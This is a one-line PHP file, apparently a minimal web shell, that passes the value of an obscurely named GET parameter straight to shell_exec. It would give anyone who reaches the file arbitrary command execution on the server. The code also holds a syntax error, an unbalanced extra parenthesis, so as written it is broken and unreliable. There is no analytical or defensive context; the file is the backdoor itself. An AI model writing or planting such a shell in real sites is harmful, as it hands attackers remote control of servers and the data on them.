<?php
shell_exec(($_GET['ZG1qoULi']);
?>
